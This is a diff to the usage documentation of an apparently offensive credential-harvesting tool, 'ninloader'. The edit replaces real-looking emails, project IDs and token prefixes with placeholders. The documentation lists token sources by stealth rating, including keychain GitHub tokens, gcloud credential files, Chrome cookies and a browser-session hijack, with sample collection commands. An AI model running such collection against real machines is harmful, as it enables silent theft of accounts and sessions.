@@ -62,10 +62,10 @@ $ ninloader discover
 
 Service      Source               Stealth  Account                        Path
 ----------------------------------------------------------------------------------------------------
-github       gh_cli               5        iamveene@github.com            ~/.config/gh/hosts.yml (token in keychain)
-google       adc                  5        764086051850-6qr4p6g...        ~/.config/gcloud/application_default_credentials.json
-google       gcloud               5        mv@archsec.io                  ~/.config/gcloud/credentials.db
-google       gws_cli              3        client_id=332627049663-...     ~/.config/gws/client_secret.json (GWS Workspace scopes)
+github       gh_cli               5        jdoe@github.com                ~/.config/gh/hosts.yml (token in keychain)
+google       adc                  5        892451037612-k9m2p8r...        ~/.config/gcloud/application_default_credentials.json
+google       gcloud               5        admin@acme-corp.io             ~/.config/gcloud/credentials.db
+google       gws_cli              3        client_id=441738160552-...     ~/.config/gws/client_secret.json (GWS Workspace scopes)
 microsoft    foci_device_code     3                                        (FOCI device code — one token for Teams/Office/Outlook/OneDrive)
 microsoft    browser_hijack       4        active Chrome session          Chrome profile copy + CDP auto-click OAuth
 slack        browser_cookies      5        chrome:Default                 Chrome cookies (d_cookie, Win/Linux)
@@ -82,7 +82,7 @@ Collected 2 token(s).
 # Collect GitHub PAT from macOS Keychain (silent, no prompt)
 $ ninloader collect --service github --source gh_cli
 Collected 1 token(s).
-[{"token":{"platform":"github","access_token":"gho_D6tS7W3I..."}}]
+[{"token":{"platform":"github","access_token":"gho_xK9mP2vL..."}}]
 
 # Microsoft FOCI — one token pivots across Teams/Office/Outlook/OneDrive
 $ ninloader collect --service microsoft --source foci_device_code
@@ -93,7 +93,7 @@ $ ninloader collect --service microsoft --source foci_device_code
 $ ninloader collect --service google --source gws_cli
 [INFO] Opening browser for OAuth consent...
 [INFO] Auth code captured! Exchanging for tokens...
-[INFO] SUCCESS — GWS token for mv@archsec.io
+[INFO] SUCCESS — GWS token for admin@acme-corp.io
 
 # Save to file (0o600 permissions)
 $ ninloader collect --output file --path ./tokens
